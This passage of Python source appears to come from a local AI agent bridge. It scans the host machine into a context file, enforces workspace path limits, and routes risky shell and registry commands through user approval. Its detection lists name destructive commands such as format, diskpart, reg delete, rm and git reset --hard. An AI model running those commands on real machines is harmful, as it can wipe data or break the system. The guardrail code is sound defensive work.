    if _SYSTEM_CONTEXT_CACHE is not None:
        ts, cached = _SYSTEM_CONTEXT_CACHE
        if time.time() - ts < _SYSTEM_CONTEXT_TTL:
            return cached
    facts: dict = {}
    # OS / platform
    try:
        import platform as _plat
        facts["os"] = f"{_plat.system()} {_plat.release()} (build {_plat.version()})"
        facts["machine"] = _plat.machine()
        facts["hostname"] = _plat.node()
    except Exception:
        pass
    # User
    try:
        facts["user"] = os.environ.get("USERNAME") or os.environ.get("USER") or ""
        facts["userprofile"] = os.environ.get("USERPROFILE") or str(Path.home())
    except Exception:
        pass

    home = Path(facts.get("userprofile") or str(Path.home()))

    # Known folders — only include if they exist
    candidates = [
        ("Desktop",     home / "Desktop"),
        ("Documents",   home / "Documents"),
        ("Downloads",   home / "Downloads"),
        ("Pictures",    home / "Pictures"),
        ("Screenshots", home / "Pictures" / "Screenshots"),
        ("Videos",      home / "Videos"),
        ("Music",       home / "Music"),
        ("OneDrive",    home / "OneDrive"),
        ("OneDrive Desktop",   home / "OneDrive" / "Desktop"),
        ("OneDrive Documents", home / "OneDrive" / "Documents"),
        ("OneDrive Pictures",  home / "OneDrive" / "Pictures"),
        ("AppData Local",   home / "AppData" / "Local"),
        ("AppData Roaming", home / "AppData" / "Roaming"),
    ]
    known: list[dict] = []
    for label, p in candidates:
        try:
            if p.exists() and p.is_dir():
                # top-level child count, bounded
                try:
                    n = 0
                    for _ in p.iterdir():
                        n += 1
                        if n >= 5000: break
                except Exception:
                    n = None
                known.append({"label": label, "path": str(p), "items": n})
        except Exception:
            pass
    facts["folders"] = known

    # System drives
    drives: list[str] = []
    if os.name == "nt":
        for letter in "CDEFGHIJKLMNOPQRSTUVWXYZ":
            if Path(f"{letter}:\\").exists():
                drives.append(f"{letter}:\\")
    facts["drives"] = drives

    # Program roots (read-only existence check)
    program_roots = []
    for p in [r"C:\Program Files", r"C:\Program Files (x86)", str(home / "AppData" / "Local" / "Programs")]:
        if Path(p).exists():
            program_roots.append(p)
    facts["program_roots"] = program_roots

    # GGUF model directories — check common llama.cpp / unsloth / lm-studio spots
    gguf_dirs = []
    candidates = [
        os.environ.get("LLAMA_MODELS"),
        str(home / "models"),
        str(home / ".cache" / "llama.cpp"),
        str(home / ".cache" / "unsloth"),
        str(home / ".cache" / "huggingface" / "hub"),
        str(home / ".lmstudio" / "models"),
        r"C:\llama.cpp\models",
    ]
    for c in candidates:
        if c and Path(c).exists():
            gguf_dirs.append(c)
    if gguf_dirs:
        facts["gguf_model_dirs"] = gguf_dirs

    facts["scanned_at"] = int(time.time())
    _SYSTEM_CONTEXT_CACHE = (time.time(), facts)
    return facts


def _render_system_context_md(facts: dict) -> str:
    lines = [
        "# ACCURETTA",
        "",
        "Machine context auto-generated on first boot. Edit freely — the bridge reads this",
        "file directly on every chat turn. Delete it to trigger a re-scan.",
        "",
        "## System",
        f"- OS: {facts.get('os', '')}",
        f"- Hostname: {facts.get('hostname', '')}",
        f"- User: {facts.get('user', '')}",
        f"- Home: {facts.get('userprofile', '')}",
    ]
    if facts.get("drives"):
        lines.append(f"- Drives: {', '.join(facts['drives'])}")
    if facts.get("gguf_model_dirs"):
        lines.append("- GGUF model directories:")
        for d in facts["gguf_model_dirs"]:
            lines.append(f"  - {d}")
    if facts.get("program_roots"):
        lines.append("- Program roots:")
        for p in facts["program_roots"]:
            lines.append(f"  - {p}")

    if facts.get("folders"):
        lines.append("")
        lines.append("## Known folders")
        for f in facts["folders"]:
            n = f.get("items")
            suffix = f" (~{n} items)" if isinstance(n, int) else ""
            lines.append(f"- {f['label']}: `{f['path']}`{suffix}")

    lines += [
        "",
        "## Notes for the agent",
        "- Use these exact paths when the user says \"my desktop\", \"my screenshots\", etc.",
        "- If a requested folder isn't listed here, ask the user or list a parent first.",
        "- The user-configured workspace (in the sidebar) is separate — prefer it for reads/writes.",
        "",
    ]
    return "\n".join(lines)


def ensure_system_context() -> str:
    """Create ACCURETTA.md on first run; return the current markdown content."""
    try:
        if not SYSTEM_CONTEXT_FILE.exists():
            facts = _scan_system_context()
            SYSTEM_CONTEXT_FILE.write_text(_render_system_context_md(facts), encoding="utf-8")
        return SYSTEM_CONTEXT_FILE.read_text(encoding="utf-8")
    except Exception as e:
        return f"# ACCURETTA\n\n(could not generate: {e})\n"


def rescan_system_context() -> str:
    try:
        facts = _scan_system_context()
        SYSTEM_CONTEXT_FILE.write_text(_render_system_context_md(facts), encoding="utf-8")
        return SYSTEM_CONTEXT_FILE.read_text(encoding="utf-8")
    except Exception as e:
        return f"# ACCURETTA\n\n(rescan failed: {e})\n"


# ---- workspace / path safety ----------------------------------------------

BLOCKED_PATH_PATTERNS = [
    re.compile(r"^[a-zA-Z]:\\Windows(\\|$)", re.IGNORECASE),
    re.compile(r"\\System32\\", re.IGNORECASE),
    re.compile(r"^[a-zA-Z]:\\Windows\\System32", re.IGNORECASE),
]


def normalize_path(p: str) -> str:
    p = os.path.expandvars(os.path.expanduser(p or ""))
    try:
        return str(Path(p).resolve())
    except Exception:
        return p


def is_blocked_path(p: str) -> bool:
    n = normalize_path(p)
    for pat in BLOCKED_PATH_PATTERNS:
        if pat.search(n):
            return True
    return False


def is_in_workspace(p: str) -> bool:
    """True if path is inside any workspace folder. Empty workspace = open access."""
    ws = get_workspace().get("folders", [])
    if not ws:
        return True
    n = normalize_path(p).lower()
    for folder in ws:
        f = normalize_path(folder).lower()
        if n == f or n.startswith(f + os.sep):
            return True
    return False


# ---- .accurettaignore -----------------------------------------------------
# gitignore-lite. each workspace folder may ship a `.accurettaignore` with one
# glob per line. blank lines and `#` comments are skipped. matching is done
# with fnmatch against (a) the path's basename and (b) the POSIX path relative
# to the workspace root — so `node_modules` catches any subtree of that name
# and `build/*.map` targets nested files. lines starting with `!` negate.
import fnmatch


_IGNORE_CACHE: dict[str, tuple[float, list[tuple[bool, str]]]] = {}


def _read_ignore_rules(ws_root: str) -> list[tuple[bool, str]]:
    ip = Path(ws_root) / IGNORE_FILE_NAME
    try:
        mtime = ip.stat().st_mtime if ip.exists() else 0.0
    except Exception:
        mtime = 0.0
    cached = _IGNORE_CACHE.get(ws_root)
    if cached and cached[0] == mtime:
        return cached[1]
    rules: list[tuple[bool, str]] = []
    if ip.exists():
        try:
            for raw in ip.read_text(encoding="utf-8", errors="replace").splitlines():
                line = raw.strip()
                if not line or line.startswith("#"):
                    continue
                neg = line.startswith("!")
                if neg:
                    line = line[1:].strip()
                if not line:
                    continue
                # strip trailing slashes; a trailing `/` in gitignore-speak means
                # "directory only" but we match by glob regardless
                line = line.rstrip("/")
                rules.append((neg, line))
        except Exception:
            rules = []
    _IGNORE_CACHE[ws_root] = (mtime, rules)
    return rules


def _workspace_root_for(path: str) -> str | None:
    n = normalize_path(path).lower()
    for folder in get_workspace().get("folders", []):
        f = normalize_path(folder)
        fl = f.lower()
        if n == fl or n.startswith(fl + os.sep):
            return f
    return None


# MIME map for the /api/wsfs/ endpoint. Anything not listed falls through
# to application/octet-stream (browser will offer to download instead of
# rendering — safe default).
_WS_FILE_MIME = {
    ".html": "text/html; charset=utf-8",
    ".htm":  "text/html; charset=utf-8",
    ".css":  "text/css; charset=utf-8",
    ".js":   "application/javascript; charset=utf-8",
    ".mjs":  "application/javascript; charset=utf-8",
    ".json": "application/json; charset=utf-8",
    ".svg":  "image/svg+xml",
    ".png":  "image/png",
    ".jpg":  "image/jpeg",
    ".jpeg": "image/jpeg",
    ".gif":  "image/gif",
    ".webp": "image/webp",
    ".ico":  "image/x-icon",
    ".woff": "font/woff",
    ".woff2":"font/woff2",
    ".ttf":  "font/ttf",
    ".otf":  "font/otf",
    ".txt":  "text/plain; charset=utf-8",
    ".md":   "text/markdown; charset=utf-8",
    ".xml":  "application/xml; charset=utf-8",
    ".map":  "application/json; charset=utf-8",
}

# Cap workspace-served file size — keeps a 4GB log from being streamed to a
# browser tab, OOMing both the bridge and the renderer.
_WS_FILE_MAX_BYTES = 50 * 1024 * 1024  # 50 MB


def resolve_workspace_file(root_raw: str, rel_raw: str) -> tuple["Path | None", "dict | None"]:
    """Resolve `<root>/<rel>` and verify the result is strictly inside the
    workspace root. Returns (resolved_path, None) on success, (None, error_dict)
    on rejection. Hardening:
      - root must exactly match a configured workspace folder (no parent dirs)
      - rel must be relative (no absolute paths, no drive letters)
      - .. is allowed in the input string but the resolved path MUST stay
        inside the resolved root (defends against `a/../../../etc`)
      - symlinks that escape the root are rejected (resolve() follows them,
        so the boundary check catches them)
      - .accurettaignore rules apply (consistency with the read tools)
      - file must exist and be a regular file (no dirs, no devices)
    """
    if not root_raw or not rel_raw:
        return None, {"error": "root and path required"}
    # 1. root must be one of the configured workspace folders, exactly
    configured = [normalize_path(f) for f in get_workspace().get("folders", [])]
    root_norm = normalize_path(root_raw)
    if root_norm not in configured:
        return None, {"error": "root not in workspace"}
    # 2. reject obviously-absolute or drive-rooted relatives
    rel = rel_raw.replace("\\", "/").lstrip("/")
    if not rel:
        return None, {"error": "empty path"}
    if os.path.isabs(rel) or (len(rel) >= 2 and rel[1] == ":"):
        return None, {"error": "absolute path not allowed"}
    # 3. resolve and re-check containment
    try:
        root_resolved = Path(root_norm).resolve(strict=True)
    except Exception:
        return None, {"error": "workspace root unreadable"}
    try:
        target_resolved = (root_resolved / rel).resolve(strict=True)
    except FileNotFoundError:
        return None, {"error": "file not found"}
    except Exception as e:
        return None, {"error": f"resolve failed: {e}"}
    try:
        # commonpath() raises ValueError on different drives; that's a reject too
        common = Path(os.path.commonpath([str(root_resolved), str(target_resolved)]))
    except ValueError:
        return None, {"error": "path escapes workspace"}
    if common != root_resolved:
        return None, {"error": "path escapes workspace"}
    # 4. must be a real file
    if not target_resolved.is_file():
        return None, {"error": "not a file"}
    # 5. honour .accurettaignore (same rules the read tools use)
    if is_ignored(str(target_resolved)):
        return None, {"error": "file is ignored by .accurettaignore"}
    return target_resolved, None


def is_ignored(path: str) -> bool:
    """True if `path` matches a rule in the enclosing workspace's .accurettaignore."""
    root = _workspace_root_for(path)
    if not root:
        return False
    rules = _read_ignore_rules(root)
    if not rules:
        return False
    rel = os.path.relpath(normalize_path(path), root).replace("\\", "/")
    if rel == "." or rel.startswith(".."):
        return False
    base = os.path.basename(rel)
    ignored = False
    for neg, pat in rules:
        # match against basename for patterns without a slash; match full rel path
        # for patterns that contain a slash (so `build/*.map` works).
        hit = False
        if "/" in pat:
            if fnmatch.fnmatch(rel, pat) or fnmatch.fnmatch(rel, pat.rstrip("/") + "/*") or any(
                fnmatch.fnmatch(rel, pat + "/" + "*") for _ in [0]
            ):
                hit = True
        else:
            # bare pattern: match any basename along the path
            parts = rel.split("/")
            if any(fnmatch.fnmatch(p, pat) for p in parts) or fnmatch.fnmatch(base, pat):
                hit = True
        if hit:
            ignored = not neg
    return ignored


# ---- command classification -----------------------------------------------

WRITE_PATTERNS = [
    re.compile(r"\bRemove-Item\b", re.IGNORECASE),
    re.compile(r"\bRemove-ItemProperty\b", re.IGNORECASE),
    re.compile(r"\bSet-Content\b", re.IGNORECASE),
    re.compile(r"\bAdd-Content\b", re.IGNORECASE),
    re.compile(r"\bOut-File\b", re.IGNORECASE),
    re.compile(r"\bNew-Item\b", re.IGNORECASE),
    re.compile(r"\bCopy-Item\b", re.IGNORECASE),
    re.compile(r"\bMove-Item\b", re.IGNORECASE),
    re.compile(r"\bRename-Item\b", re.IGNORECASE),
    re.compile(r"\bSet-ItemProperty\b", re.IGNORECASE),
    re.compile(r"\bNew-ItemProperty\b", re.IGNORECASE),
    re.compile(r"\bInvoke-WebRequest\b.*-OutFile\b", re.IGNORECASE),
    re.compile(r"\bInvoke-RestMethod\b.*-OutFile\b", re.IGNORECASE),
    re.compile(r"\bStart-Process\b", re.IGNORECASE),
    re.compile(r"\b(rm|del|erase|rmdir|rd|mkdir|md|move|copy|xcopy|robocopy|ren)\b", re.IGNORECASE),
    re.compile(r"(^|\s)>\s*\S"),
    re.compile(r"(^|\s)>>\s*\S"),
    re.compile(r"\bgit\s+(push|reset\s+--hard|clean\s+-|checkout\s+--|branch\s+-D)", re.IGNORECASE),
    re.compile(r"\bnpm\s+(install|uninstall|publish)\b", re.IGNORECASE),
    re.compile(r"\bpip\s+(install|uninstall)\b", re.IGNORECASE),
    re.compile(r"\bwinget\s+(install|uninstall|upgrade)\b", re.IGNORECASE),
    re.compile(r"\bchoco\s+(install|uninstall|upgrade)\b", re.IGNORECASE),
    re.compile(r"\breg\s+(add|delete|import)\b", re.IGNORECASE),
    re.compile(r"\bformat\b", re.IGNORECASE),
    re.compile(r"\bdiskpart\b", re.IGNORECASE),
]


def needs_approval(cmd: str) -> bool:
    if not cmd:
        return False
    for pat in WRITE_PATTERNS:
        if pat.search(cmd):
            return True
    return False


# ---- registry guardrails ---------------------------------------------------
# Registry writes are the single highest-blast-radius operation the agent
# can do on Windows — one bad value under HKLM can brick the OS. We split
# protection into two tiers based on which hive the command touches:
#
#   - SYSTEM hives (HKLM, HKCR, HKU): hard-refused at the bridge. The
#     agent gets an error back; no approval card is even shown. This
#     matches "format-my-PC" territory.
#   - USER hives (HKCU, HKCC): routed through a special REGISTRY EDIT
#     approval card on the frontend with hold-to-approve, so a single
#     mis-click can't push through a registry write.
#
# Opaque imports — `reg import file.reg` or `regedit /s file.reg` — escalate
# to SYSTEM because the actual target hive isn't visible from the cmd
# string alone, and .reg files in the wild routinely write HKLM.
_REG_SYSTEM_HIVES = (
    "HKLM:", "HKCR:", "HKU:",
    "HKEY_LOCAL_MACHINE", "HKEY_CLASSES_ROOT", "HKEY_USERS",
)
_REG_USER_HIVES = (
    "HKCU:", "HKCC:",
    "HKEY_CURRENT_USER", "HKEY_CURRENT_CONFIG",
)
_REG_WRITE_VERBS = re.compile(
    r"\b("
    r"Set-ItemProperty|New-ItemProperty|Remove-ItemProperty|Clear-ItemProperty"
    r"|New-Item|Remove-Item|Rename-Item|Copy-Item|Move-Item"
    r"|reg\s+(?:add|delete|copy|restore)"
    r")\b",
    re.IGNORECASE,
)
_REG_OPAQUE_IMPORT = re.compile(
    r"\b(reg\s+import\b|regedit(?:\.exe)?\s+(?:/s\b|-s\b))",
    re.IGNORECASE,
)
_REG_LAUNCH_REGEDIT = re.compile(
    r"\b(Start-Process\s+regedit|^\s*regedit(?:\.exe)?\b|;\s*regedit(?:\.exe)?\b)",
    re.IGNORECASE,
)


def registry_assess(cmd: str) -> dict:
    """Classify whether a PowerShell/cmd string writes to the registry, and
    at what blast-radius. Returns {"level": "none"|"user"|"system",
    "targets": [matched hive references]}.

    Conservative on ambiguity — `reg import` / `regedit /s` and bare
    `regedit` launches escalate to "system" because their actual targets
    aren't visible in the cmd string.
    """
    if not cmd:
        return {"level": "none", "targets": []}
    # Opaque imports / regedit launches: can't see the target, assume worst.
    if _REG_OPAQUE_IMPORT.search(cmd) or _REG_LAUNCH_REGEDIT.search(cmd):
        return {"level": "system", "targets": ["(opaque: .reg file or regedit launch)"]}
    # No registry-write verb? Then this command can't be writing to registry.
    # (Set-ItemProperty / New-Item also work on filesystem PSDrives, so we
    # need to see both a write verb AND a hive reference.)
    if not _REG_WRITE_VERBS.search(cmd):
        return {"level": "none", "targets": []}
    system_hits: list[str] = []
    user_hits: list[str] = []
    # Match hive prefix + the path that follows it. Stop at whitespace,
    # quote, comma, semicolon, or backtick (PowerShell line continuation).
    for hive in _REG_SYSTEM_HIVES:
        for m in re.finditer(re.escape(hive) + r"[\\:\w.()$ -]*", cmd, re.IGNORECASE):
            system_hits.append(m.group(0).strip())
    for hive in _REG_USER_HIVES:
        for m in re.finditer(re.escape(hive) + r"[\\:\w.()$ -]*", cmd, re.IGNORECASE):
            user_hits.append(m.group(0).strip())
    if system_hits:
        # Dedupe while preserving order; user hits ride along so the
        # approval card can show the full picture even though the level
        # is determined by the more dangerous one.
        seen = set()
        targets = []
        for t in system_hits + user_hits:
            if t.lower() not in seen:
                seen.add(t.lower())
                targets.append(t)
        return {"level": "system", "targets": targets}
    if user_hits:
        seen = set()
        targets = []
        for t in user_hits:
            if t.lower() not in seen:
                seen.add(t.lower())
                targets.append(t)
        return {"level": "user", "targets": targets}
    # Write verb found but no hive reference → not a registry write
    # (e.g. Set-ItemProperty against a filesystem path).
    return {"level": "none", "targets": []}


# ---- bridge self-protection ------------------------------------------------
# Some local models, when iterating on a web UI that needs npm rebuilds or
# flask restarts, also kill the python process running THIS file — taking
# down Accuretta itself mid-session. Approval can't help: by the time the
# user clicks "approve" on a generic Stop-Process, the model has lost track
# of which python is which. So we hard-refuse any tool call that names
# bridge.py, the bridge's PID, or destructive verbs against port 8787,
# regardless of approval state.

_BRIDGE_FILE_ABS = ""
try:
    _BRIDGE_FILE_ABS = str(Path(__file__).resolve()).lower()
except Exception:
    _BRIDGE_FILE_ABS = ""

_BRIDGE_PID = os.getpid()

# Patterns matched against the raw PowerShell command string.
_PROT_BRIDGE_FILE_RE = re.compile(r"\bbridge\.py\b", re.IGNORECASE)
_PROT_DESTROY_FILE_RE = re.compile(
    r"\b(remove-item|del|erase|rd|rmdir|move-item|out-file|set-content|add-content|"
    r"clear-content|new-item\s+-force)\b",
    re.IGNORECASE,
)
_PROT_KILL_VERB_RE = re.compile(
    r"\b(stop-process|taskkill|tskill|kill)\b",
    re.IGNORECASE,
)
_PROT_PORT_RE = re.compile(r"(?<!\d)8787(?!\d)")


def is_bridge_self_path(path: str) -> bool:
    """True if `path` resolves to this running bridge.py."""
    if not path or not _BRIDGE_FILE_ABS:
        return False
    try:
        return str(Path(path).resolve()).lower() == _BRIDGE_FILE_ABS
    except Exception:
        return False


def bridge_self_threat(cmd: str) -> str | None:
    """Return a refusal reason if `cmd` would kill or corrupt the bridge.
    Pattern-only check — runs before approval so even an approved Stop-Process
    against our PID gets refused. Returns None if the command is safe."""
    if not cmd:
        return None
    low = cmd.lower()

    # Direct PID reference + a kill verb.
    if str(_BRIDGE_PID) in cmd and _PROT_KILL_VERB_RE.search(cmd):
        # Avoid false positives: the PID has to appear as a standalone token,
        # not as a substring of some unrelated number.
        if re.search(rf"(?<!\d){_BRIDGE_PID}(?!\d)", cmd):
            return f"command targets the bridge's own process (pid {_BRIDGE_PID})"

    # bridge.py + a destructive file verb.
    if _PROT_BRIDGE_FILE_RE.search(cmd) and _PROT_DESTROY_FILE_RE.search(cmd):
        return "command would overwrite or delete bridge.py"

    # Port 8787 + a kill verb. `Get-NetTCPConnection -LocalPort 8787` on its
    # own is fine (read-only); only refuse when paired with a process killer.
    if _PROT_PORT_RE.search(cmd) and _PROT_KILL_VERB_RE.search(cmd):
        return f"command would kill the bridge's listener (port {PORT})"

    return None


# ---- approval queue --------------------------------------------------------

_approvals: dict[str, dict] = {}
_approval_events: dict[str, threading.Event] = {}
_approvals_lock = threading.Lock()


# Approval kinds that are ordinary in-workspace file writes. When the user has
# turned on "trust writes", these skip the approval prompt — the calling tools
# have already validated the path is inside the workspace and not a blocked
# system path, so nothing here can touch Windows/System32, the registry, etc.
_SAFE_WRITE_KINDS = {"write_file", "edit_file", "replace_ast_node"}


def request_approval(title: str, command: str, details: dict | None = None, timeout_s: int = 600) -> dict:
    """Create a pending approval, block worker until user responds, return decision.
    When `auto_approve_write` is set, safe in-workspace file writes are approved
    instantly; delete / registry / powershell / git / desktop / launch always
    still prompt."""
    details = details or {}
    try:
        if details.get("kind") in _SAFE_WRITE_KINDS and get_settings().get("auto_approve_write"):
            return {"status": "auto-approved", "decision": "approve", "auto": True, "details": details}
    except Exception:
        pass
    aid = uuid.uuid4().hex[:12]
    ev = threading.Event()
    entry = {
        "id": aid,
        "title": title,
        "command": command,
        "details": details or {},
        "created": time.time(),
        "status": "pending",
        "decision": None,
    }
    with _approvals_lock:
        _approvals[aid] = entry
        _approval_events[aid] = ev
    save_json(PENDING_DIR / f"{aid}.json", entry)
    broadcast_event({"type": "approval:new", "approval": entry})
    got = ev.wait(timeout=timeout_s)
    with _approvals_lock:
        final = _approvals.pop(aid, entry)
        _approval_events.pop(aid, None)
    (PENDING_DIR / f"{aid}.json").unlink(missing_ok=True)
    if not got:
        final["status"] = "timeout"
        final["decision"] = "deny"
    return final


def decide_approval(aid: str, decision: str) -> bool:
    with _approvals_lock:
        entry = _approvals.get(aid)
        ev = _approval_events.get(aid)
        if not entry or not ev:
            return False
        entry["decision"] = "approve" if decision == "approve" else "deny"
        entry["status"] = "decided"
        ev.set()
    broadcast_event({"type": "approval:decided", "id": aid, "decision": entry["decision"]})
    return True


def list_approvals() -> list[dict]:
    with _approvals_lock:
        return [dict(v) for v in _approvals.values() if v.get("status") == "pending"]


# ---- SSE event bus ---------------------------------------------------------
# Reconnect-friendly pub/sub. Every broadcast assigns a monotonic id and
# appends to a small ring buffer (last EVENT_LOG_MAX events). The SSE
# handler reads `Last-Event-ID` from the request, replays anything missed
# from the buffer, then resumes the live stream — recovers cleanly from
# wifi flicker / sleep / brief disconnects without losing tool_result or
# approval events. Subscribers also get the snapshot id at subscribe time
# so events newer than the snapshot only arrive via the live queue (no
# duplicates between replay and queue).

from collections import deque

EVENT_LOG_MAX = 256

_subscribers: list[Queue] = []
_subs_lock = threading.Lock()
_event_log: deque = deque(maxlen=EVENT_LOG_MAX)  # holds (id, evt) tuples
_event_log_id = 0  # monotonic counter, only incremented under _subs_lock


def subscribe() -> tuple[Queue, int]:
    """Returns (queue, snapshot_id). snapshot_id is the highest event id
    that existed BEFORE this subscription returns — used by the SSE handler
    to slice the replay log so events newer than snapshot_id are delivered
    via the queue (avoids dupes between replay and live stream)."""
    q: Queue = Queue(maxsize=1024)
    with _subs_lock:
        _subscribers.append(q)
        return q, _event_log_id


def unsubscribe(q: Queue) -> None:
    with _subs_lock:
        if q in _subscribers:
            _subscribers.remove(q)


def broadcast_event(evt: dict) -> None:
    global _event_log_id
    with _subs_lock:
        _event_log_id += 1
        evt_id = _event_log_id
        # Tag a copy so the original dict the caller passed isn't mutated.
        # Clients that want the id can read evt['_id']; the SSE handler
        # writes it into the wire `id:` field for Last-Event-ID resume.
        logged = dict(evt)
        logged["_id"] = evt_id
        _event_log.append((evt_id, logged))
        dead = []
        for q in _subscribers:
            try:
                q.put_nowait(logged)
            except Exception:
                dead.append(q)
        for q in dead:
            try:
                _subscribers.remove(q)
            except Exception:
                pass


def replay_events_since(since_id: int, up_to_id: int) -> list:
    """Return logged events with since_id < id <= up_to_id, in order.
    Snapshot under the lock so we don't iterate a deque mid-append."""
    with _subs_lock:
        return [(i, e) for (i, e) in _event_log if since_id < i <= up_to_id]


# ---- tool implementations --------------------------------------------------

def tool_list_directory(args: dict) -> dict:
    path = normalize_path(args.get("path") or str(Path.home()))
    if is_blocked_path(path):
        return {"error": "path blocked (Windows/System32)"}
    if not os.path.isdir(path):
        return {"error": f"not a directory: {path}"}
    out = []
    skipped = 0
    try:
        for entry in sorted(os.listdir(path)):
            full = os.path.join(path, entry)
            if is_ignored(full):
                skipped += 1
                continue
            try:
                st = os.stat(full)
                out.append({
                    "name": entry,
                    "path": full,
                    "dir": os.path.isdir(full),
                    "size": st.st_size if os.path.isfile(full) else None,
                    "mtime": int(st.st_mtime),
                })
            except Exception:
                continue
    except PermissionError as e:
        return {"error": f"permission denied: {e}"}
    resp = {"path": path, "entries": out[:200]}
    if skipped:
        resp["ignored"] = skipped
    if len(out) > 200:
        resp["truncated"] = True
    return resp


# Cap on extracted PDF text. Most readable PDFs land between 5 KB and 200 KB
# of plain text; this ceiling matches the 64 KB binary cap used elsewhere so
# the model isn't drowned in a 500-page contract.
_PDF_TEXT_CAP = 64 * 1024


def _extract_pdf_text(path: str) -> dict:
    """Pull a text rendering out of a PDF for the model to read.
    Strategy:
      1. Try pypdf — pure-Python, ships in most envs, fast for text PDFs.
      2. Try pdfplumber — better at preserving table-ish layouts when present.
      3. Bail with a clear error pointing at install + scanned-PDF caveat.
    Scanned (image-only) PDFs have no embedded text layer; the extractor
    will return an empty string and we flag that explicitly so the model
    knows to suggest OCR instead of pretending the file was empty."""
    try:
        from pypdf import PdfReader  # type: ignore
    except Exception:
        try:
            # very old envs sometimes only have PyPDF2 — same API
            from PyPDF2 import PdfReader  # type: ignore
        except Exception:
            PdfReader = None  # type: ignore

    pages_text: list[str] = []
    page_count = 0
    backend_used = ""
    last_err = ""

    if PdfReader is not None:
        try:
            reader = PdfReader(path)
            page_count = len(reader.pages)
            for i, page in enumerate(reader.pages):
                try:
                    t = page.extract_text() or ""
                except Exception as e:
                    t = f"[page {i + 1}: extraction error — {e}]"
                if t.strip():
                    pages_text.append(f"--- page {i + 1} ---\n{t.rstrip()}")
                # short-circuit if we already blew the cap
                if sum(len(p) for p in pages_text) > _PDF_TEXT_CAP:
                    break
            backend_used = "pypdf"
        except Exception as e:
            last_err = f"pypdf failed: {e}"

    # If pypdf gave us nothing usable, try pdfplumber (better with tables).
    if not pages_text:
        try:
            import pdfplumber  # type: ignore
            with pdfplumber.open(path) as pdf:
                page_count = len(pdf.pages)
                for i, page in enumerate(pdf.pages):
                    try:
                        t = page.extract_text() or ""
                    except Exception as e:
                        t = f"[page {i + 1}: extraction error — {e}]"
                    if t.strip():
                        pages_text.append(f"--- page {i + 1} ---\n{t.rstrip()}")
                    if sum(len(p) for p in pages_text) > _PDF_TEXT_CAP:
                        break
            backend_used = "pdfplumber"
        except ImportError:
            pass
        except Exception as e:
            last_err = (last_err + " · " if last_err else "") + f"pdfplumber failed: {e}"

    if PdfReader is None and not backend_used:
        return {
            "error": (
                "PDF text extraction needs pypdf. Install with:\n"
                "  pip install pypdf\n"
                "(optional, better for tables: pip install pdfplumber)"
            )
        }

    text = "\n\n".join(pages_text).strip()
    if not text:
        # Empty extract usually means a scanned/image-only PDF, or the PDF
        # was malformed. Either way the model needs to know it's not blank.
        msg = (
            f"[no extractable text — PDF appears to be scanned (image-only) "
            f"or has no text layer; {page_count} page(s) found]"
        )
        if last_err:
            msg += f"\n[extractor note: {last_err}]"
        return {
            "path": path,
            "content": msg,
            "truncated": False,
            "size": os.path.getsize(path),
            "pdf": {"pages": page_count, "backend": backend_used or "none", "empty": True},
        }

    truncated = len(text) > _PDF_TEXT_CAP
    if truncated:
        text = text[:_PDF_TEXT_CAP] + "\n\n[... PDF truncated to 64 KB ...]"
    return {
        "path": path,
        "content": text,
        "truncated": truncated,
        "size": os.path.getsize(path),
        "pdf": {"pages": page_count, "backend": backend_used, "empty": False},
    }


# ---- file read-state tracking (anti-stale / anti-clobber) -----------------
# Record each file's on-disk hash WHEN THE MODEL READS IT, per chat. If it then
# tries to fully overwrite a file it never read (or that changed since it read),
# we stop the clobber — the #1 cause of "it undid its own fix" on long tasks.
_chat_file_reads: dict[str, dict[str, str]] = {}
_chat_file_reads_lock = threading.Lock()


def _file_md5(path: str) -> str:
    import hashlib
    try:
        return hashlib.md5(Path(path).read_bytes()).hexdigest()
    except Exception:
        return ""


def _record_file_read(path: str) -> None:
    cid = _get_current_chat()
    if not cid:
        return
    h = _file_md5(path)
    if h:
        with _chat_file_reads_lock:
            _chat_file_reads.setdefault(cid, {})[normalize_path(path)] = h


def _file_staleness(path: str) -> str:
    """'' = the model's view is current. Otherwise a short reason it may be stale."""
    cid = _get_current_chat()
    if not cid or not os.path.isfile(path):
        return ""
    npath = normalize_path(path)
    with _chat_file_reads_lock:
        seen = _chat_file_reads.get(cid, {}).get(npath)
    if seen is None:
        return "never read this session"
    cur = _file_md5(path)
    if cur and cur != seen:
        return "changed since you last read it"
    return ""


def tool_read_file(args: dict) -> dict:
    path = normalize_path(args.get("path") or "")
    if not path or not os.path.isfile(path):
        return {"error": f"not a file: {path}"}
    if is_blocked_path(path):
        return {"error": "path blocked (Windows/System32)"}
    if not is_in_workspace(path):
        return {"error": "path outside workspace. Add folder in Workspace panel."}
    if is_ignored(path):
        return {"error": f"path ignored by .accurettaignore: {path}"}
    # PDFs are binary containers — reading the bytes as UTF-8 yields garbage
    # ("unicode jumbles"). Route them through a dedicated extractor that
    # returns the actual page text, page-numbered, with a clear note when
    # the PDF is scanned/image-only and has no text layer at all.
    if path.lower().endswith(".pdf"):
        return _extract_pdf_text(path)
    # Line-based pagination. The previous implementation just returned the
    # first 64KB with truncated=true, which gave the model no way to access
    # the rest — and models would loop on read_file thinking that "trying
    # again" might somehow get fresh bytes (it doesn't; same call, same
    # response). The fix has two parts:
    #   1. Accept an `offset` arg (0-indexed starting line). Default 0.
    #   2. When the response is truncated, emit a hint that explicitly says
    #      "retrying with the same args returns the SAME chunk — use
    #      offset=N to read further."
    # 64KB byte cap stays in place so a single read can never blow context;
    # offset just lets the model walk through a large file chunk by chunk.
    offset = max(0, int(args.get("offset") or 0))
    # 20KB chunk: large enough to see a function or a chunk of HTML in one read,
    # small enough that the serialized result stays UNDER the read_file result
    # cap (32000) so compress_tool_result never elides it a second time. Keep
    # these two numbers in sync — that double-truncation is what made models
    # thrash on large files.
    BYTE_CAP = 20 * 1024
    try:
        try:
            full_text = Path(path).read_text(encoding="utf-8")
        except UnicodeDecodeError:
            full_text = Path(path).read_bytes().decode("latin-1", errors="replace")
        total_size = len(full_text.encode("utf-8", errors="replace"))
        lines = full_text.splitlines(keepends=True)
        total_lines = len(lines)
        _record_file_read(path)  # the model has now seen this file's current state
        if offset >= total_lines and total_lines > 0:
            return {
                "path": path,
                "content": "",
                "offset": offset,
                "total_lines": total_lines,
                "size": total_size,
                "note": (
                    f"offset {offset} is past EOF — file has {total_lines} lines "
                    f"(0-indexed: 0..{total_lines - 1}). Nothing to read here."
                ),
            }
        # Walk lines from offset, accumulating until we hit BYTE_CAP. Always
        # include at least one line even if it's larger than the cap (so a
        # giant single-line minified file still returns something).
        chunk_parts: list[str] = []
        byte_count = 0
        end = offset
        for i in range(offset, total_lines):
            line_bytes = len(lines[i].encode("utf-8", errors="replace"))
